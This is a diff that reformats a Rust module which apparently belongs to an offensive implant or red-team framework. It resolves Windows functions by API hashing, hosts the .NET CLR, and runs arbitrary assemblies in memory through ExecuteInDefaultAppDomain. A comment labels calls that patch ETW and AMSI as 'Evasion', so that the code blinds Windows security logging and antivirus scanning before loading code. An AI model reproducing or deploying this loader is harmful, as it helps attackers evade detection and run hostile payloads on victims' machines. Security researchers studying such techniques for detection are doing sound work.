@@ -19,34 +19,70 @@ use crate::utils::windows_definitions::*;
 
 #[cfg(target_os = "windows")]
 #[allow(non_upper_case_globals)]
-pub const CLSID_CLRMetaHost: GUID = GUID::new(0x9280188d, 0x0e8e, 0x4867, [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde]);
+pub const CLSID_CLRMetaHost: GUID = GUID::new(
+    0x9280188d,
+    0x0e8e,
+    0x4867,
+    [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
+);
 #[cfg(target_os = "windows")]
 #[allow(non_upper_case_globals)]
-pub const IID_ICLRMetaHost: GUID = GUID::new(0xD332DB9E, 0xB9B3, 0x4125, [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16]);
+pub const IID_ICLRMetaHost: GUID = GUID::new(
+    0xD332DB9E,
+    0xB9B3,
+    0x4125,
+    [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
+);
 #[cfg(target_os = "windows")]
 #[allow(non_upper_case_globals)]
-pub const IID_ICLRRuntimeInfo: GUID = GUID::new(0xBD39D1D2, 0xBA2F, 0x486a, [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91]);
+pub const IID_ICLRRuntimeInfo: GUID = GUID::new(
+    0xBD39D1D2,
+    0xBA2F,
+    0x486a,
+    [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
+);
 #[cfg(target_os = "windows")]
 #[allow(non_upper_case_globals)]
-pub const IID_ICLRRuntimeHost: GUID = GUID::new(0x90F1A06C, 0x7712, 0x4762, [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]);
+pub const IID_ICLRRuntimeHost: GUID = GUID::new(
+    0x90F1A06C,
+    0x7712,
+    0x4762,
+    [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
+);
 #[cfg(target_os = "windows")]
 #[allow(non_upper_case_globals)]
-pub const CLSID_CLRRuntimeHost: GUID = GUID::new(0x90F1A06E, 0x7712, 0x4762, [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]);
+pub const CLSID_CLRRuntimeHost: GUID = GUID::new(
+    0x90F1A06E,
+    0x7712,
+    0x4762,
+    [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
+);
 
 // ICLRMetaHost Interface
 #[cfg(target_os = "windows")]
 #[repr(C)]
 #[allow(non_snake_case)]
 pub struct ICLRMetaHostVtbl {
-    pub QueryInterface: unsafe extern "system" fn(*mut ICLRMetaHost, *const GUID, *mut *mut c_void) -> i32,
+    pub QueryInterface:
+        unsafe extern "system" fn(*mut ICLRMetaHost, *const GUID, *mut *mut c_void) -> i32,
     pub AddRef: unsafe extern "system" fn(*mut ICLRMetaHost) -> u32,
     pub Release: unsafe extern "system" fn(*mut ICLRMetaHost) -> u32,
-    pub GetRuntime: unsafe extern "system" fn(*mut ICLRMetaHost, *const u16, *const GUID, *mut *mut c_void) -> i32,
-    pub GetVersionFromFile: unsafe extern "system" fn(*mut ICLRMetaHost, *const u16, *mut u16, *mut u32) -> i32,
-    pub EnumerateInstalledRuntimes: unsafe extern "system" fn(*mut ICLRMetaHost, *mut *mut c_void) -> i32,
-    pub EnumerateLoadedRuntimes: unsafe extern "system" fn(*mut ICLRMetaHost, *mut c_void, *mut *mut c_void) -> i32,
-    pub RequestRuntimeLoadedNotification: unsafe extern "system" fn(*mut ICLRMetaHost, *mut c_void) -> i32,
-    pub QueryLegacyV2RuntimeBinding: unsafe extern "system" fn(*mut ICLRMetaHost, *const GUID, *mut *mut c_void) -> i32,
+    pub GetRuntime: unsafe extern "system" fn(
+        *mut ICLRMetaHost,
+        *const u16,
+        *const GUID,
+        *mut *mut c_void,
+    ) -> i32,
+    pub GetVersionFromFile:
+        unsafe extern "system" fn(*mut ICLRMetaHost, *const u16, *mut u16, *mut u32) -> i32,
+    pub EnumerateInstalledRuntimes:
+        unsafe extern "system" fn(*mut ICLRMetaHost, *mut *mut c_void) -> i32,
+    pub EnumerateLoadedRuntimes:
+        unsafe extern "system" fn(*mut ICLRMetaHost, *mut c_void, *mut *mut c_void) -> i32,
+    pub RequestRuntimeLoadedNotification:
+        unsafe extern "system" fn(*mut ICLRMetaHost, *mut c_void) -> i32,
+    pub QueryLegacyV2RuntimeBinding:
+        unsafe extern "system" fn(*mut ICLRMetaHost, *const GUID, *mut *mut c_void) -> i32,
     pub ExitProcess: unsafe extern "system" fn(*mut ICLRMetaHost, i32) -> i32,
 }
 
@@ -61,16 +97,27 @@ pub struct ICLRMetaHost {
 #[repr(C)]
 #[allow(non_snake_case)]
 pub struct ICLRRuntimeInfoVtbl {
-    pub QueryInterface: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const GUID, *mut *mut c_void) -> i32,
+    pub QueryInterface:
+        unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const GUID, *mut *mut c_void) -> i32,
     pub AddRef: unsafe extern "system" fn(*mut ICLRRuntimeInfo) -> u32,
     pub Release: unsafe extern "system" fn(*mut ICLRRuntimeInfo) -> u32,
-    pub GetVersionString: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut u16, *mut u32) -> i32,
-    pub GetRuntimeDirectory: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut u16, *mut u32) -> i32,
+    pub GetVersionString:
+        unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut u16, *mut u32) -> i32,
+    pub GetRuntimeDirectory:
+        unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut u16, *mut u32) -> i32,
     pub IsLoaded: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut c_void, *mut i32) -> i32,
-    pub LoadErrorString: unsafe extern "system" fn(*mut ICLRRuntimeInfo, u32, *mut u16, *mut u32, i32) -> i32,
-    pub LoadLibrary: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const u16, *mut *mut c_void) -> i32,
-    pub GetProcAddress: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const u8, *mut *mut c_void) -> i32,
-    pub GetInterface: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const GUID, *const GUID, *mut *mut c_void) -> i32,
+    pub LoadErrorString:
+        unsafe extern "system" fn(*mut ICLRRuntimeInfo, u32, *mut u16, *mut u32, i32) -> i32,
+    pub LoadLibrary:
+        unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const u16, *mut *mut c_void) -> i32,
+    pub GetProcAddress:
+        unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const u8, *mut *mut c_void) -> i32,
+    pub GetInterface: unsafe extern "system" fn(
+        *mut ICLRRuntimeInfo,
+        *const GUID,
+        *const GUID,
+        *mut *mut c_void,
+    ) -> i32,
 }
 
 #[cfg(target_os = "windows")]
@@ -84,7 +131,8 @@ pub struct ICLRRuntimeInfo {
 #[repr(C)]
 #[allow(non_snake_case)]
 pub struct ICLRRuntimeHostVtbl {
-    pub QueryInterface: unsafe extern "system" fn(*mut ICLRRuntimeHost, *const GUID, *mut *mut c_void) -> i32,
+    pub QueryInterface:
+        unsafe extern "system" fn(*mut ICLRRuntimeHost, *const GUID, *mut *mut c_void) -> i32,
     pub AddRef: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> u32,
     pub Release: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> u32,
     pub Start: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> i32,
@@ -92,10 +140,24 @@ pub struct ICLRRuntimeHostVtbl {
     pub SetHostControl: unsafe extern "system" fn(*mut ICLRRuntimeHost, *mut c_void) -> i32,
     pub GetCLRControl: unsafe extern "system" fn(*mut ICLRRuntimeHost, *mut *mut c_void) -> i32,
     pub UnloadAppDomain: unsafe extern "system" fn(*mut ICLRRuntimeHost, u32, *mut c_void) -> i32,
-    pub ExecuteInAppDomain: unsafe extern "system" fn(*mut ICLRRuntimeHost, u32, *mut c_void, *mut c_void) -> i32,
+    pub ExecuteInAppDomain:
+        unsafe extern "system" fn(*mut ICLRRuntimeHost, u32, *mut c_void, *mut c_void) -> i32,
     pub GetCurrentAppDomainId: unsafe extern "system" fn(*mut ICLRRuntimeHost, *mut u32) -> i32,
-    pub ExecuteApplication: unsafe extern "system" fn(*mut ICLRRuntimeHost, *const u16, u32, *const *const u16, *mut u32) -> i32,
-    pub ExecuteInDefaultAppDomain: unsafe extern "system" fn(*mut ICLRRuntimeHost, *const u16, *const u16, *const u16, *const u16, *mut u32) -> i32,
+    pub ExecuteApplication: unsafe extern "system" fn(
+        *mut ICLRRuntimeHost,
+        *const u16,
+        u32,
+        *const *const u16,
+        *mut u32,
+    ) -> i32,
+    pub ExecuteInDefaultAppDomain: unsafe extern "system" fn(
+        *mut ICLRRuntimeHost,
+        *const u16,
+        *const u16,
+        *const u16,
+        *const u16,
+        *mut u32,
+    ) -> i32,
 }
 
 #[cfg(target_os = "windows")]
@@ -122,40 +184,65 @@ impl ClrHost {
                 let kernel32 = hash_str(b"kernel32.dll");
                 let load_library = resolve_function(kernel32, hash_str(b"LoadLibraryA"));
                 type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
-                let h_mod = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"mscoree.dll\0".as_ptr());
-                
-                if h_mod.is_null() { return Err(()); }
-            }
-            
-            let clr_create_instance_addr = resolve_function(mscoree_hash, clr_create_instance_hash);
-            if clr_create_instance_addr.is_null() { return Err(()); }
+                let h_mod = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(
+                    b"mscoree.dll\0".as_ptr(),
+                );
 
-            type FnCLRCreateInstance = unsafe extern "system" fn(*const GUID, *const GUID, *mut *mut c_void) -> i32;
-            let clr_create_instance: FnCLRCreateInstance = core::mem::transmute(clr_create_instance_addr);
+                if h_mod.is_null() {
+                    return Err(());
+                }
+            }
+
+            let clr_create_instance_addr = resolve_function(mscoree_hash, clr_create_instance_hash);
+            if clr_create_instance_addr.is_null() {
+                return Err(());
+            }
+
+            type FnCLRCreateInstance =
+                unsafe extern "system" fn(*const GUID, *const GUID, *mut *mut c_void) -> i32;
+            let clr_create_instance: FnCLRCreateInstance =
+                core::mem::transmute(clr_create_instance_addr);
 
             // Evasion: Patch ETW and AMSI before loading CLR
             let _ = crate::modules::patch::patch_etw();
             let _ = crate::modules::patch::patch_amsi();
 
             let mut meta_host: *mut ICLRMetaHost = core::ptr::null_mut();
-            if clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &mut meta_host as *mut _ as *mut *mut c_void) < 0 {
+            if clr_create_instance(
+                &CLSID_CLRMetaHost,
+                &IID_ICLRMetaHost,
+                &mut meta_host as *mut _ as *mut *mut c_void,
+            ) < 0
+            {
                 return Err(());
             }
 
             let mut runtime_info: *mut ICLRRuntimeInfo = core::ptr::null_mut();
             // v4.0.30319
             let version = [
-                'v' as u16, '4' as u16, '.' as u16, '0' as u16, '.' as u16, 
-                '3' as u16, '0' as u16, '3' as u16, '1' as u16, '9' as u16, 0
+                'v' as u16, '4' as u16, '.' as u16, '0' as u16, '.' as u16, '3' as u16, '0' as u16,
+                '3' as u16, '1' as u16, '9' as u16, 0,
             ];
-            
-            if ((*(*meta_host).vtbl).GetRuntime)(meta_host, version.as_ptr(), &IID_ICLRRuntimeInfo, &mut runtime_info as *mut _ as *mut *mut c_void) < 0 {
+
+            if ((*(*meta_host).vtbl).GetRuntime)(
+                meta_host,
+                version.as_ptr(),
+                &IID_ICLRRuntimeInfo,
+                &mut runtime_info as *mut _ as *mut *mut c_void,
+            ) < 0
+            {
                 ((*(*meta_host).vtbl).Release)(meta_host);
                 return Err(());
             }
 
             let mut runtime_host: *mut ICLRRuntimeHost = core::ptr::null_mut();
-            if ((*(*runtime_info).vtbl).GetInterface)(runtime_info, &CLSID_CLRRuntimeHost, &IID_ICLRRuntimeHost, &mut runtime_host as *mut _ as *mut *mut c_void) < 0 {
+            if ((*(*runtime_info).vtbl).GetInterface)(
+                runtime_info,
+                &CLSID_CLRRuntimeHost,
+                &IID_ICLRRuntimeHost,
+                &mut runtime_host as *mut _ as *mut *mut c_void,
+            ) < 0
+            {
                 ((*(*runtime_info).vtbl).Release)(runtime_info);
                 ((*(*meta_host).vtbl).Release)(meta_host);
                 return Err(());
@@ -179,12 +266,16 @@ impl ClrHost {
         unsafe {
             let host = Self::load_clr()?;
             let mut ret_val = 0;
-            
+
             // Convert strings to wide strings (UTF-16)
-            let mut path_w: Vec<u16> = path.encode_utf16().collect(); path_w.push(0);
-            let mut class_w: Vec<u16> = class.encode_utf16().collect(); class_w.push(0);
-            let mut method_w: Vec<u16> = method.encode_utf16().collect(); method_w.push(0);
-            let mut arg_w: Vec<u16> = arg.encode_utf16().collect(); arg_w.push(0);
+            let mut path_w: Vec<u16> = path.encode_utf16().collect();
+            path_w.push(0);
+            let mut class_w: Vec<u16> = class.encode_utf16().collect();
+            class_w.push(0);
+            let mut method_w: Vec<u16> = method.encode_utf16().collect();
+            method_w.push(0);
+            let mut arg_w: Vec<u16> = arg.encode_utf16().collect();
+            arg_w.push(0);
 
             let hr = ((*(*host).vtbl).ExecuteInDefaultAppDomain)(
                 host,
@@ -192,7 +283,7 @@ impl ClrHost {
                 class_w.as_ptr(),
                 method_w.as_ptr(),
                 arg_w.as_ptr(),
-                &mut ret_val
+                &mut ret_val,
             );
 
             ((*(*host).vtbl).Release)(host);
@@ -210,7 +301,12 @@ impl ClrHost {
     }
 
     #[cfg(not(target_os = "windows"))]
-    pub fn execute_assembly(_path: &str, _class: &str, _method: &str, _arg: &str) -> Result<i32, ()> {
+    pub fn execute_assembly(
+        _path: &str,
+        _class: &str,
+        _method: &str,
+        _arg: &str,
+    ) -> Result<i32, ()> {
         Err(())
     }
 }
